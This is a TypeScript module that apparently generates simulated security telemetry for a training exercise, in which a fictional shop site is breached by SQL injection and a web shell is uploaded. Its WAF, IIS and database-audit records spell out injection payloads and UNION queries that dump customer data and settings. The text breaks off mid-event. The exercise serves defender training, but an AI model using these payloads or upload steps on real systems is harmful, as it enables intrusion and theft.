/**
 * Events-only half of the ./webShellRce.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./webShellRce.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { serviceNowRecord } from "@/lib/sim/emitters/servicenow";
import { mdeProcess, mdeFile, mdeAlert } from "@/lib/sim/emitters/mde";
import { panConnection } from "@/lib/sim/emitters/paloalto";
import { infobloxDns } from "./nativeRecords.events";

/** Telemetry half of `buildWebShellRceScenario`: the events and the story title, no answer key. */
export function webShellRceScenarioEvents() {
  const B = new Date("2026-03-17T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const web = { hostname: "WEB-SHOP-01", ip: "10.40.12.21", site: "shop.nexacorp.com" };
  const db = { hostname: "SQL-SHOP-02", ip: "10.40.12.55", database: "ShopDB" };
  const albIp = "10.40.12.9";

  // Attacker infrastructure — the source IP rotates across the probing phase.
  const atkA = "45.146.130.72";
  const atkB = "45.146.130.88";
  const atkC = "91.242.229.35"; // the IP that lands the successful injection
  const c2Ip = "194.26.29.114";
  const c2Dom = "cdn-shopassets.link";

  // Authorized quarterly external ASV scan — Qualys cloud scanner range.
  const scannerIp = "64.39.106.131";

  const shellHash = "e4ca7770ea1290c68874e81e6dc6a2376304c9ebb3eb002fca67a9f4dbdb7ca1";
  const spoofHash = "d41c7b930a2e58f6b71d904c3e85a2f716c09db45f823a1e97d604cb2a1f7e35";

  const webAclArn =
    "arn:aws:wafv2:eu-west-1:481920347761:regional/webacl/shop-prod-waf/8f3c2b1a-64d7-4e10-9b52-7c31ad0e5f62";
  const albId = "481920347761-app/shop-prod-alb/1a2b3c4d5e6f7a8b";

  // EDR↔scenario integration (Phase 4): one incident. Server RCE on the web host
  // (w3wp → web shell → cmd on WEB-SHOP-01) → edr_scope "edr". The WAF/IIS/DB
  // planes are edge, transport and repository evidence; the Defender detection on
  // the IIS worker spawning cmd.exe is the alert-grade EDR behavioural crux.
  const INCIDENT = "inc:wsr:1";

  const uaPython = "python-requests/2.31.0";
  const uaQualys = "Mozilla/5.0 (compatible; Qualys/9.6.4; +https://www.qualys.com/scanner)";
  const uaChrome =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";

  const cx = { companyId: "nexacorp" as const };
  const DEVICE_NAME = "web-shop-01.nexacorp.com";
  const DEVICE_ID = "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2";
  const POOL_SID = "S-1-5-82-1274839021-3315088842-4194903328-2971184652-1108255477";
  const W3WP_CMD = "w3wp.exe -ap \"ShopPortal\" -v \"v4.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipm5e4a1c30-7f21-4b9d-a0c4-2d81b6e9f307 -h \"C:\\inetpub\\temp\\apppools\\ShopPortal\\ShopPortal.config\" -w \"\" -m 0";
  const shellUrlPath = "/assets/js/vendor/bootstrap.bundle.aspx";
  const vendorDir = "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor";
  const sys32 = "C:\\Windows\\System32\\";
  const hashes = {
    w3wp: makeSha256("windows_system32_inetsrv_w3wp_exe_signed_microsoft"),
    cmd: makeSha256("windows_system32_cmd_exe_signed_microsoft"),
    tar: makeSha256("windows_system32_tar_exe_signed_microsoft"),
    curl: makeSha256("windows_system32_curl_exe_signed_microsoft"),
  };

  // A Defender for Endpoint process row on WEB-SHOP-01, in the same dialect as the rows authored
  // above it (DeviceName is the lower-case FQDN, FolderPath includes the file name).
  const mdeRow = (id: string, ts: string, p: {
    name: string; path: string; cmdline: string; parent: string; parentPid: number; pid: number; sha: string;
    system?: boolean; parentSystem?: boolean; signed?: boolean; mitre?: string; tactic?: string; severity?: "low" | "medium" | "high" | "critical"; description: string;
  }): TelemetryEvent => {
    const e = mdeProcess({
      ...cx, id, ts, host: web.hostname, srcIp: web.ip, user: null,
      processName: p.name, processPath: p.path, cmdline: p.cmdline, parentName: p.parent, parentPid: p.parentPid, pid: p.pid,
      sha256: p.sha, integrity: p.system ? "System" : "High", signed: p.signed ?? true,
      runAsUser: p.system ? "NT AUTHORITY\\SYSTEM" : "IIS APPPOOL\\ShopPortal",
      accountName: p.system ? "SYSTEM" : "ShopPortal", accountDomain: p.system ? "NT AUTHORITY" : "IIS APPPOOL",
      mitre: p.mitre, tactic: p.tactic, severity: p.severity ?? "low", description: p.description,
    });
    Object.assign(e.raw, {
      "Timestamp": ts, "DeviceName": DEVICE_NAME, "DeviceId": DEVICE_ID, "FolderPath": p.path,
      "AccountSid": p.system ? "S-1-5-18" : POOL_SID, "ProcessTokenElevation": "TokenElevationTypeDefault",
      "InitiatingProcessAccountDomain": p.parentSystem ? "NT AUTHORITY" : "IIS APPPOOL",
      "InitiatingProcessAccountName": p.parentSystem ? "SYSTEM" : "ShopPortal",
    });
    return e;
  };

  // AWS WAF record for a request the web ACL let through (nothing terminated it).
  const wafAllow = (id: string, offsetMs: number, o: { method: "GET" | "POST"; uri: string; args: string; contentType?: string; length: number; requestId: string; description: string }): TelemetryEvent => ({
    id, ts: T(offsetMs), source: "waf", vendor: "AWS WAF", event_type: "waf_allow",
    hostname: web.hostname, src_ip: atkC, dst_ip: web.ip, dst_port: 443, protocol: "tcp", severity: "low",
    network: { url: `https://${web.site}${o.uri}`, domain: web.site, method: o.method, user_agent: uaChrome },
    description: o.description,
    raw: {
      formatVersion: 1,
      timestamp: B + offsetMs,
      webaclId: webAclArn,
      terminatingRuleId: "Default_Action",
      terminatingRuleType: "REGULAR",
      action: "ALLOW",
      terminatingRuleMatchDetails: [],
      httpSourceName: "ALB",
      httpSourceId: albId,
      "ruleGroupList[0].ruleGroupId": "AWS#AWSManagedRulesCommonRuleSet",
      "ruleGroupList[0].terminatingRule": null,
      "ruleGroupList[0].nonTerminatingMatchingRules": [],
      "ruleGroupList[0].excludedRules": null,
      "ruleGroupList[1].ruleGroupId": "AWS#AWSManagedRulesSQLiRuleSet",
      "ruleGroupList[1].terminatingRule": null,
      "ruleGroupList[1].nonTerminatingMatchingRules": [],
      "ruleGroupList[1].excludedRules": null,
      rateBasedRuleList: [],
      nonTerminatingMatchingRules: [],
      requestHeadersInserted: null,
      responseCodeSent: null,
      "httpRequest.clientIp": atkC,
      "httpRequest.country": "RU",
      "httpRequest.httpMethod": o.method,
      "httpRequest.uri": o.uri,
      "httpRequest.args": o.args,
      "httpRequest.httpVersion": "HTTP/1.1",
      "httpRequest.requestId": o.requestId,
      "httpRequest.headers[0].name": "Host",
      "httpRequest.headers[0].value": "shop.nexacorp.com",
      "httpRequest.headers[1].name": "User-Agent",
      "httpRequest.headers[1].value": uaChrome,
      "httpRequest.headers[2].name": "Content-Type",
      "httpRequest.headers[2].value": o.contentType ?? "application/x-www-form-urlencoded",
      "httpRequest.headers[3].name": "Content-Length",
      "httpRequest.headers[3].value": String(o.length),
    },
  });

  // IIS W3C access-log row (Sentinel W3CIISLog table) for a request to the dropped web shell.
  const shellCall = (id: string, offsetMs: number, utc: string, o: { scBytes: number; csBytes: number; taken: number; description: string }): TelemetryEvent => ({
    id, ts: T(offsetMs), source: "siem", vendor: "Microsoft Sentinel", event_type: "http_request",
    hostname: web.hostname, dst_ip: web.ip, dst_port: 443, protocol: "tcp", severity: "medium",
    network: { url: `https://${web.site}${shellUrlPath}`, domain: web.site, method: "POST", status: 200, user_agent: uaChrome },
    description: o.description,
    raw: {
      TimeGenerated: utc,
      Computer: "WEB-SHOP-01.nexacorp.com",
      sSiteName: "SHOPPORTAL",
      sComputerName: "WEB-SHOP-01",
      sIP: "10.40.12.21",
      sPort: "443",
      csMethod: "POST",
      csUriStem: shellUrlPath,
      csUriQuery: "-",
      csUserName: "-",
      cIP: albIp,
      csHost: "shop.nexacorp.com",
      csUserAgent: uaChrome,
      csReferer: "-",
      scStatus: "200",
      scSubStatus: "0",
      scWin32Status: "0",
      scBytes: String(o.scBytes),
      csBytes: String(o.csBytes),
      TimeTaken: String(o.taken),
      csVersion: "HTTP/1.1",
      Type: "W3CIISLog",
    },
  });

  const events: TelemetryEvent[] = [
    // ── CONTEXT: the change record that authorises the external scanner ────────
    serviceNowRecord({
      ...cx, id: "evt_00_asv_change", ts: T(-(6 * 24 + 3) * 60 * MIN), table: "change_request", number: "CHG0042611", state: "Scheduled",
      shortDescription: "Quarterly PCI ASV external vulnerability scan of shop.nexacorp.com", severity: "informational",
      extra: {
        "servicenow.type": "Standard", "servicenow.approval": "Approved", "servicenow.risk": "Low",
        "servicenow.assignment_group": "Security Operations", "servicenow.requested_by": "m.levi@nexacorp.com", "servicenow.approved_by": "CAB - Security",
        "servicenow.cmdb_ci": "shop-prod-alb", "servicenow.start_date": "2026-03-17 09:00:00", "servicenow.end_date": "2026-03-17 11:00:00",
        "servicenow.description": "External PCI ASV scan of shop.nexacorp.com by the Qualys cloud scanner. Scanner source address 64.39.106.131 is allow-listed on the web ACL for the window (times UTC).",
        "servicenow.sys_updated_on": "2026-03-11 06:00:00",
      },
      description: "Change CHG0042611 schedules the quarterly external PCI ASV scan of shop.nexacorp.com for 09:00 to 11:00 UTC on 17 March from the scanner address 64.39.106.131.",
    }),

    // ── CONTEXT: the IIS worker process the app pool runs in ───────────────────
    mdeRow("evt_00a_w3wp_start", T(-45 * MIN - 2_000), {
      name: "w3wp.exe", path: `${sys32}inetsrv\\w3wp.exe`, cmdline: W3WP_CMD, parent: "svchost.exe", parentPid: 1464, pid: 6188,
      sha: hashes.w3wp, parentSystem: true,
      description: "The IIS worker process for the ShopPortal application pool started on WEB-SHOP-01 as IIS APPPOOL\\ShopPortal, parent svchost.exe.",
    }),

    // ── CONTEXT: what the web server's service account is allowed to do ────────
    {
      id: "evt_01_apppool_privileges",
      ts: T(-45 * MIN),
      source: "ad",
      vendor: "Windows Security",
      event_type: "auth_success",
      hostname: web.hostname,
      severity: "informational",
      description:
        "The ShopPortal IIS application pool worker on WEB-SHOP-01 logged on as the virtual account IIS APPPOOL\\ShopPortal and was issued its service privilege set (Event 4672).",
      raw: {
        "winlog.event_id": "4672",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "WEB-SHOP-01.nexacorp.com",
        "winlog.record_id": "8841207",
        "winlog.event_data.SubjectUserSid": "S-1-5-82-1274839021-3315088842-4194903328-2971184652-1108255477",
        "winlog.event_data.SubjectUserName": "ShopPortal",
        "winlog.event_data.SubjectDomainName": "IIS APPPOOL",
        "winlog.event_data.SubjectLogonId": "0x9C41A2",
        "winlog.event_data.PrivilegeList":
          "SeAssignPrimaryTokenPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeImpersonatePrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeChangeNotifyPrivilege\n\t\t\tSeCreateGlobalPrivilege\n\t\t\tSeIncreaseWorkingSetPrivilege",
        "event.code": "4672",
        "event.action": "special-privileges-assigned",
        "event.outcome": "success",
        "host.name": "WEB-SHOP-01",
        "user.name": "IIS APPPOOL\\ShopPortal",
        "logon.type": "5",
      },
    },

    // ── RECON: attacker content-discovery sweep against the storefront ─────────
    {
      id: "evt_02_recon_sweep",
      ts: T(0),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "http_request",
      hostname: web.hostname,
      src_ip: atkA,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "low",
      mitre_technique: "T1595.003",
      mitre_tactic: "Reconnaissance",
      network: { url: `https://${web.site}/.git/config`, domain: web.site, method: "GET", status: 404, user_agent: uaPython },
      description:
        "IIS access record for shop.nexacorp.com, one of a rapid burst of requests against paths that do not exist on the site — all 404, User-Agent python-requests.",
      raw: {
        TimeGenerated: "2026-03-17T09:00:00.412Z",
        Computer: "WEB-SHOP-01.nexacorp.com",
        sSiteName: "SHOPPORTAL",
        sComputerName: "WEB-SHOP-01",
        sIP: "10.40.12.21",
        sPort: "443",
        csMethod: "GET",
        csUriStem: "/.git/config",
        csUriQuery: "-",
        csUserName: "-",
        cIP: albIp,
        csHost: "shop.nexacorp.com",
        csUserAgent: uaPython,
        csReferer: "-",
        scStatus: "404",
        scSubStatus: "0",
        scWin32Status: "2",
        scBytes: "1245",
        csBytes: "319",
        TimeTaken: "4",
        csVersion: "HTTP/1.1",
        Type: "W3CIISLog",
      },
    },

    {
      id: "evt_02b_recon_sweep_2",
      ts: T(31_000),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "http_request",
      hostname: web.hostname,
      src_ip: atkA,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "low",
      mitre_technique: "T1595.003",
      mitre_tactic: "Reconnaissance",
      network: { url: `https://${web.site}/wp-login.php`, domain: web.site, method: "GET", status: 404, user_agent: uaPython },
      description:
        "A second IIS access record from the same burst: GET /wp-login.php, 404, User-Agent python-requests.",
      raw: {
        TimeGenerated: "2026-03-17T09:00:31.208Z",
        Computer: "WEB-SHOP-01.nexacorp.com",
        sSiteName: "SHOPPORTAL",
        sComputerName: "WEB-SHOP-01",
        sIP: "10.40.12.21",
        sPort: "443",
        csMethod: "GET",
        csUriStem: "/wp-login.php",
        csUriQuery: "-",
        csUserName: "-",
        cIP: albIp,
        csHost: "shop.nexacorp.com",
        csUserAgent: uaPython,
        csReferer: "-",
        scStatus: "404",
        scSubStatus: "0",
        scWin32Status: "2",
        scBytes: "1245",
        csBytes: "311",
        TimeTaken: "3",
        csVersion: "HTTP/1.1",
        Type: "W3CIISLog",
      },
    },

    // ── NOISE: the authorized quarterly ASV scan trips the same signatures ─────
    {
      id: "evt_03_waf_block_sqli_q",
      ts: T(6 * MIN),
      source: "waf",
      vendor: "AWS WAF",
      event_type: "waf_block",
      hostname: web.hostname,
      src_ip: scannerIp,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "low",
      expected_verdict: "fp",
      fp_explanation:
        "64.39.106.131 is inside the Qualys cloud scanner range that NexaCorp whitelisted for its quarterly PCI ASV external scan (change record CHG0042611, window 09:00 to 11:00 UTC on 17 Mar). The scanner fires the whole SQLi payload catalogue at every parameter it finds and the WAF blocks all of it — high volume, uniform payloads, a single source IP that never rotates, and a self-identifying User-Agent. It is scanning noise, not exploitation.",
      network: { url: `https://${web.site}/products/search.aspx`, domain: web.site, method: "GET", status: 403, user_agent: uaQualys },
      description:
        "AWS WAF blocked a SQL injection payload from 64.39.106.131. Representative of a sustained burst from this single address across many parameters and paths.",
      raw: {
        formatVersion: 1,
        timestamp: 1773738360000,
        webaclId: webAclArn,
        terminatingRuleId: "AWS-AWSManagedRulesSQLiRuleSet",
        terminatingRuleType: "MANAGED_RULE_GROUP",
        action: "BLOCK",
        "terminatingRuleMatchDetails[0].conditionType": "SQL_INJECTION",
        "terminatingRuleMatchDetails[0].sensitivityLevel": "LOW",
        "terminatingRuleMatchDetails[0].location": "QUERY_STRING",
        "terminatingRuleMatchDetails[0].matchedData": "['\\'', 'or', '1', '=', '1']",
        httpSourceName: "ALB",
        httpSourceId: albId,
        "ruleGroupList[0].ruleGroupId": "AWS#AWSManagedRulesSQLiRuleSet",
        "ruleGroupList[0].terminatingRule.ruleId": "SQLi_QUERYARGUMENTS",
        "ruleGroupList[0].terminatingRule.action": "BLOCK",
        "ruleGroupList[0].nonTerminatingMatchingRules": [],
        "ruleGroupList[0].excludedRules": null,
        rateBasedRuleList: [],
        nonTerminatingMatchingRules: [],
        requestHeadersInserted: null,
        responseCodeSent: "403",
        "httpRequest.clientIp": scannerIp,
        "httpRequest.country": "US",
        "httpRequest.httpMethod": "GET",
        "httpRequest.uri": "/products/search.aspx",
        "httpRequest.args": "q=test%27%20or%201%3D1--",
        "httpRequest.httpVersion": "HTTP/1.1",
        "httpRequest.requestId": "1-67d84a08-2f19c4b76d0e5a3819bb4c72",
        "httpRequest.headers[0].name": "Host",
        "httpRequest.headers[0].value": "shop.nexacorp.com",
        "httpRequest.headers[1].name": "User-Agent",
        "httpRequest.headers[1].value": uaQualys,
        "labels[0].name": "awswaf:managed:aws:sql-database:SQLi_QueryArguments",
      },
    },

    // ── PROBE 1: naive injection in the query string — blocked ────────────────
    {
      id: "evt_04_waf_block_tautology",
      ts: T(19 * MIN),
      source: "waf",
      vendor: "AWS WAF",
      event_type: "waf_block",
      hostname: web.hostname,
      src_ip: atkA,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      network: { url: `https://${web.site}/products/search.aspx`, domain: web.site, method: "GET", status: 403, user_agent: uaPython },
      description:
        "AWS WAF blocked a tautology injection (q=widget' OR 1=1--) on /products/search.aspx from 45.146.130.72 — managed SQLi rule matched the query string, 403 returned.",
      raw: {
        formatVersion: 1,
        timestamp: 1773739140000,
        webaclId: webAclArn,
        terminatingRuleId: "AWS-AWSManagedRulesSQLiRuleSet",
        terminatingRuleType: "MANAGED_RULE_GROUP",
        action: "BLOCK",
        "terminatingRuleMatchDetails[0].conditionType": "SQL_INJECTION",
        "terminatingRuleMatchDetails[0].sensitivityLevel": "LOW",
        "terminatingRuleMatchDetails[0].location": "QUERY_STRING",
        "terminatingRuleMatchDetails[0].matchedData": "['\\'', 'or', '1', '=', '1']",
        httpSourceName: "ALB",
        httpSourceId: albId,
        "ruleGroupList[0].ruleGroupId": "AWS#AWSManagedRulesSQLiRuleSet",
        "ruleGroupList[0].terminatingRule.ruleId": "SQLi_QUERYARGUMENTS",
        "ruleGroupList[0].terminatingRule.action": "BLOCK",
        "ruleGroupList[0].nonTerminatingMatchingRules": [],
        "ruleGroupList[0].excludedRules": null,
        rateBasedRuleList: [],
        nonTerminatingMatchingRules: [],
        responseCodeSent: "403",
        "httpRequest.clientIp": atkA,
        "httpRequest.country": "NL",
        "httpRequest.httpMethod": "GET",
        "httpRequest.uri": "/products/search.aspx",
        "httpRequest.args": "q=widget%27%20OR%201%3D1--",
        "httpRequest.httpVersion": "HTTP/1.1",
        "httpRequest.requestId": "1-67d84be4-91af35d2c7043b6e2d18aa50",
        "httpRequest.headers[0].name": "Host",
        "httpRequest.headers[0].value": "shop.nexacorp.com",
        "httpRequest.headers[1].name": "User-Agent",
        "httpRequest.headers[1].value": uaPython,
        "labels[0].name": "awswaf:managed:aws:sql-database:SQLi_QueryArguments",
      },
    },

    // ── PROBE 2: UNION attempt from a rotated address — also blocked ──────────
    {
      id: "evt_05_waf_block_union",
      ts: T(24 * MIN),
      source: "waf",
      vendor: "AWS WAF",
      event_type: "waf_block",
      hostname: web.hostname,
      src_ip: atkB,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      network: { url: `https://${web.site}/products/detail.aspx`, domain: web.site, method: "GET", status: 403, user_agent: uaPython },
      description:
        "AWS WAF blocked a UNION SELECT payload on /products/detail.aspx from 45.146.130.88, User-Agent python-requests, 403 returned.",
      raw: {
        formatVersion: 1,
        timestamp: 1773739440000,
        webaclId: webAclArn,
        terminatingRuleId: "AWS-AWSManagedRulesSQLiRuleSet",
        terminatingRuleType: "MANAGED_RULE_GROUP",
        action: "BLOCK",
        "terminatingRuleMatchDetails[0].conditionType": "SQL_INJECTION",
        "terminatingRuleMatchDetails[0].sensitivityLevel": "LOW",
        "terminatingRuleMatchDetails[0].location": "QUERY_STRING",
        "terminatingRuleMatchDetails[0].matchedData": "['union', 'select', 'from']",
        httpSourceName: "ALB",
        httpSourceId: albId,
        "ruleGroupList[0].ruleGroupId": "AWS#AWSManagedRulesSQLiRuleSet",
        "ruleGroupList[0].terminatingRule.ruleId": "SQLi_QUERYARGUMENTS",
        "ruleGroupList[0].terminatingRule.action": "BLOCK",
        "ruleGroupList[0].nonTerminatingMatchingRules": [],
        "ruleGroupList[0].excludedRules": null,
        rateBasedRuleList: [],
        nonTerminatingMatchingRules: [],
        responseCodeSent: "403",
        "httpRequest.clientIp": atkB,
        "httpRequest.country": "NL",
        "httpRequest.httpMethod": "GET",
        "httpRequest.uri": "/products/detail.aspx",
        "httpRequest.args": "id=4471%20UNION%20SELECT%20name%2C1%2C1%20FROM%20sys.tables--",
        "httpRequest.httpVersion": "HTTP/1.1",
        "httpRequest.requestId": "1-67d84d10-58c2ba9147ef30d16a7c2298",
        "httpRequest.headers[0].name": "Host",
        "httpRequest.headers[0].value": "shop.nexacorp.com",
        "httpRequest.headers[1].name": "User-Agent",
        "httpRequest.headers[1].value": uaPython,
        "labels[0].name": "awswaf:managed:aws:sql-database:SQLi_QueryArguments",
      },
    },

    // ── THE ONE THAT LANDS: injection past the 8 KB body-inspection window ────
    {
      id: "evt_06_waf_allow_oversize_body",
      ts: T(38 * MIN),
      source: "waf",
      vendor: "AWS WAF",
      event_type: "waf_allow",
      hostname: web.hostname,
      src_ip: atkC,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      network: { url: `https://${web.site}/api/v2/inventory/lookup`, domain: web.site, method: "POST", user_agent: uaChrome },
      description:
        "AWS WAF returned ALLOW on a 12,438-byte POST to /api/v2/inventory/lookup from 91.242.229.35, presenting a Chrome browser User-Agent.",
      raw: {
        formatVersion: 1,
        timestamp: 1773740280000,
        webaclId: webAclArn,
        terminatingRuleId: "Default_Action",
        terminatingRuleType: "REGULAR",
        action: "ALLOW",
        "terminatingRuleMatchDetails": [],
        httpSourceName: "ALB",
        httpSourceId: albId,
        "oversizeFields[0]": "REQUEST_BODY",
        "ruleGroupList[0].ruleGroupId": "AWS#AWSManagedRulesCommonRuleSet",
        "ruleGroupList[0].terminatingRule": null,
        "ruleGroupList[0].nonTerminatingMatchingRules": [],
        "ruleGroupList[0].excludedRules[0].exclusionType": "EXCLUDED_AS_COUNT",
        "ruleGroupList[0].excludedRules[0].ruleId": "SizeRestrictions_BODY",
        "ruleGroupList[1].ruleGroupId": "AWS#AWSManagedRulesSQLiRuleSet",
        "ruleGroupList[1].terminatingRule": null,
        "ruleGroupList[1].nonTerminatingMatchingRules": [],
        "ruleGroupList[1].excludedRules": null,
        rateBasedRuleList: [],
        nonTerminatingMatchingRules: [],
        requestHeadersInserted: null,
        responseCodeSent: null,
        "httpRequest.clientIp": atkC,
        "httpRequest.country": "RU",
        "httpRequest.httpMethod": "POST",
        "httpRequest.uri": "/api/v2/inventory/lookup",
        "httpRequest.args": "",
        "httpRequest.httpVersion": "HTTP/1.1",
        "httpRequest.requestId": "1-67d85058-3ea71c9f4d206b8853fa1107",
        "httpRequest.headers[0].name": "Host",
        "httpRequest.headers[0].value": "shop.nexacorp.com",
        "httpRequest.headers[1].name": "User-Agent",
        "httpRequest.headers[1].value": uaChrome,
        "httpRequest.headers[2].name": "Content-Type",
        "httpRequest.headers[2].value": "application/json",
        "httpRequest.headers[3].name": "Content-Length",
        "httpRequest.headers[3].value": "12438",
        "labels[0].name": "awswaf:managed:aws:core-rule-set:SizeRestrictions_Body",
      },
    },

    // ── SAME REQUEST, WEB SERVER SIDE ────────────────────────────────────────
    {
      id: "evt_07_iis_lookup_200",
      ts: T(38 * MIN + 11_000),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "http_request",
      hostname: web.hostname,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      network: { url: `https://${web.site}/api/v2/inventory/lookup`, domain: web.site, method: "POST", status: 200, user_agent: uaChrome },
      description:
        "IIS answered the inventory lookup POST with 200, returning 3,312,486 bytes in 11,284 ms. The cIP recorded on the request is 10.40.12.9.",
      raw: {
        TimeGenerated: "2026-03-17T09:38:11.284Z",
        Computer: "WEB-SHOP-01.nexacorp.com",
        sSiteName: "SHOPPORTAL",
        sComputerName: "WEB-SHOP-01",
        sIP: "10.40.12.21",
        sPort: "443",
        csMethod: "POST",
        csUriStem: "/api/v2/inventory/lookup",
        csUriQuery: "-",
        csUserName: "-",
        cIP: albIp,
        csHost: "shop.nexacorp.com",
        csUserAgent: uaChrome,
        csReferer: "-",
        scStatus: "200",
        scSubStatus: "0",
        scWin32Status: "0",
        scBytes: "3312486",
        csBytes: "12438",
        TimeTaken: "11284",
        csVersion: "HTTP/1.1",
        Type: "W3CIISLog",
      },
    },

    // ── DATABASE: the injected UNION executes with the app's own permissions ──
    {
      id: "evt_08_db_customer_dump",
      ts: T(38 * MIN + 11_000),
      source: "db_monitor",
      vendor: "Microsoft SQL Server Audit",
      event_type: "db_query",
      hostname: db.hostname,
      src_ip: web.ip,
      dst_ip: db.ip,
      dst_port: 1433,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1213",
      mitre_tactic: "Collection",
      description:
        "SQL Server Audit recorded an inventory lookup SELECT extended with a UNION against dbo.Customers, run as shopportal_app and returning 42,318 rows.",
      raw: {
        event_time: "2026-03-17 09:38:11.2840000",
        sequence_number: "1",
        action_id: "SL",
        succeeded: "1",
        class_type: "OB",
        session_id: "94",
        server_principal_name: "shopportal_app",
        database_principal_name: "shopportal_app",
        server_instance_name: "SQL-SHOP-02\\MSSQLSERVER",
        database_name: "ShopDB",
        schema_name: "dbo",
        object_name: "Customers",
        statement:
          "SELECT Sku, QtyOnHand FROM dbo.Inventory WHERE Sku = '' UNION ALL SELECT CustomerId, Email FROM dbo.Customers--'",
        client_ip: "10.40.12.21",
        application_name: ".Net SqlClient Data Provider",
        host_name: "WEB-SHOP-01",
        duration_milliseconds: "11041",
        response_rows: "42318",
        affected_rows: "0",
        audit_file_offset: "58880",
        file_name: "F:\\SQLAudit\\ShopDB_Audit_A47C_1.sqlaudit",
      },
    },

    // ── DATABASE: application secrets read out of a settings table ────────────
    {
      id: "evt_09_db_appsettings",
      ts: T(44 * MIN),
      source: "db_monitor",
      vendor: "Microsoft SQL Server Audit",
      event_type: "db_query",
      hostname: db.hostname,
      src_ip: web.ip,
      dst_ip: db.ip,
      dst_port: 1433,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1552",
      mitre_tactic: "Credential Access",
      description:
        "Six minutes later the same statement pattern returned SettingKey and SettingValue from dbo.AppSettings — 37 rows, again as shopportal_app.",
      raw: {
        event_time: "2026-03-17 09:44:00.6120000",
        sequence_number: "1",
        action_id: "SL",
        succeeded: "1",
        class_type: "OB",
        session_id: "97",
        server_principal_name: "shopportal_app",
        database_principal_name: "shopportal_app",
        server_instance_name: "SQL-SHOP-02\\MSSQLSERVER",
        database_name: "ShopDB",
        schema_name: "dbo",
        object_name: "AppSettings",
        statement:
          "SELECT Sku, QtyOnHand FROM dbo.Inventory WHERE Sku = '' UNION ALL SELECT SettingKey, SettingValue FROM dbo.AppSettings--'",
        client_ip: "10.40.12.21",
        application_name: ".Net SqlClient Data Provider",
        host_name: "WEB-SHOP-01",
        duration_milliseconds: "38",
        response_rows: "37",
        affected_rows: "0",
        audit_file_offset: "61952",
        file_name: "F:\\SQLAudit\\ShopDB_Audit_A47C_1.sqlaudit",
      },
    },

    wafAllow("evt_09a_waf_allow_post", 47 * MIN - 400, {
      method: "POST", uri: "/admin/content/upload.ashx", args: "key=d0f4a1c8-7b23-4e19-9a56-cc81e0b47f3d&target=assets%2Fjs%2Fvendor&name=bootstrap.bundle.aspx",
      contentType: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW", length: 9614, requestId: "1-67d8548c-4b6d19e0a52f7c3318de6a41",
      description: "AWS WAF returned ALLOW on a 9,614-byte POST to /admin/content/upload.ashx from 91.242.229.35, Chrome browser User-Agent.",
    }),

    // ── DELIVERY: the stolen key is used against the legacy upload handler ────
    {
      id: "evt_10_iis_upload_201",
      ts: T(47 * MIN),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "http_request",
      hostname: web.hostname,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1505.003",
      mitre_tactic: "Persistence",
      network: { url: `https://${web.site}/admin/content/upload.ashx`, domain: web.site, method: "POST", status: 201, user_agent: uaChrome },
      description:
        "A POST to /admin/content/upload.ashx was accepted with 201. Its query string carries a key parameter, target assets/js/vendor and name bootstrap.bundle.aspx.",
      raw: {
        TimeGenerated: "2026-03-17T09:47:00.905Z",
        Computer: "WEB-SHOP-01.nexacorp.com",
        sSiteName: "SHOPPORTAL",
        sComputerName: "WEB-SHOP-01",
        sIP: "10.40.12.21",
        sPort: "443",
        csMethod: "POST",
        csUriStem: "/admin/content/upload.ashx",
        csUriQuery:
          "key=d0f4a1c8-7b23-4e19-9a56-cc81e0b47f3d&target=assets%2fjs%2fvendor&name=bootstrap.bundle.aspx",
        csUserName: "-",
        cIP: albIp,
        csHost: "shop.nexacorp.com",
        csUserAgent: uaChrome,
        csReferer: "-",
        scStatus: "201",
        scSubStatus: "0",
        scWin32Status: "0",
        scBytes: "412",
        csBytes: "9614",
        TimeTaken: "268",
        csVersion: "HTTP/1.1",
        Type: "W3CIISLog",
      },
    },

    // ── PERSISTENCE: the shell lands on disk, written by the app pool itself ──
    {
      id: "evt_11_webshell_written",
      ts: T(47 * MIN + 1_000),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "file_create",
      hostname: web.hostname,
      severity: "critical",
      mitre_technique: "T1505.003",
      mitre_tactic: "Persistence",
      file: {
        name: "bootstrap.bundle.aspx",
